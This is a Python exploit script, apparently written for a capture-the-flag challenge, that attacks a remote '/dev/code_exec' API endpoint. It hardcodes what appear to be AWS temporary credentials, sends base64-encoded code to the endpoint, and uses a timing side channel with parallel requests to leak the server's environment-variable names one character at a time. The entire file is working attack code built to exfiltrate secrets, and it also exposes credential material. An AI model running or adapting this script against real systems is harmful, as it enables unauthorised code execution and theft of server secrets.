import base64
import requests
import time
from aws_requests_auth.aws_auth import AWSRequestsAuth
import concurrent.futures
import string

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIMLIFTXQE",
                       aws_secret_access_key="2pFYytUGEJ61BMm0LEWESi0d71uWsf2TjoGpwObR",
                       aws_token="IQoJb3JpZ2luX2VjELb//////////wEaDGlsLWNlbnRyYWwtMSJGMEQCIDpaG+c2mutY4AeFGfNj7oLjQMeRIsmd0NuI37jMbzhrAiA0PNs5JJEosI8VsHZvtRtKgyq1OZfrfHIoOzZBoAugeyq1AggjEAAaDDEyMTc3NDA1Mjg4MCIMUFWh9GRVwObVUas1KpICQXRQ0m3on3qF93Q0rOaryZIVQNYEgWm6UKvUzYd+i/s6gHXodfCt1JKYpsPNqQ4gwrxvCKiP8Tr2f3tZ7Wox+TH2TTxNjYyzsDw3iedbCJp+5NXZ8xEerIpmIeyMKFM4s//Cn4k3i70ysMD3cgFkYX3A4EvOeP1bE0JukWRwJEGftHlKpmtYjijVGtGCu2bc58w9LTIRSsAztboEt4muWQ2xlNa5IYEXaciHoU3VnpkU537ZlGqpnO3MVyXukDhmj6wVhS231TXp1LS9FW9YirdqA1LU6JwCgGERQiC6FZte6VqeQW7/UvbgcIkTvUiYqHL/vzY6+TsoTNuYiqjJ0wrL4mp3FmMT5VSV6vyKEtD4FDDkhszTBjqeAd5NRHgUIjh1w6DyNpim5EeZx7ULUCpbxkUEwpyZRXQHtukm7sOeGsP4HSgp3/DvLu2pS+YhLlWx8ag+KoLE1WVynoEpjvNbG6NXlUK0eCsS81BdGTy0kHRdJCV36nZQLEdoDCPxjAZn4Nd0kihI9HU0k7EFKvtuQCtTf7B8hIydoVFQu/WMw3AAQRjYQyHDy58kBUo9u65TTgHWqZSg",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_char(idx, char):
    # Escape single quotes in char
    c = char.replace("'", "\\'")
    code = f"""
import os
import time
keys = sorted(list(os.environ.keys()))
env_str = str(keys)
if len(env_str) > {idx} and env_str[{idx}] == '{c}':
    time.sleep(2.5)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(url, json={"code": encoded_code}, auth=auth, timeout=6)
    except:
        pass
    elapsed = time.time() - start
    return char, elapsed > 2.0

alphabet = string.printable

def get_env():
    flag = ""
    for idx in range(1000):
        found = False
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(test_char, idx, c): c for c in alphabet if c != "'"}
            # add the single quote back to the alphabet to test
            futures[executor.submit(test_char, idx, "'")] = "'"
            
            for future in concurrent.futures.as_completed(futures):
                char, is_match = future.result()
                if is_match:
                    flag += char
                    print(f"\\rKeys so far: {flag}", end="", flush=True)
                    found = True
                    break
        if not found:
            break
    print(f"\\nFinal Keys: {flag}")

if __name__ == "__main__":
    get_env()
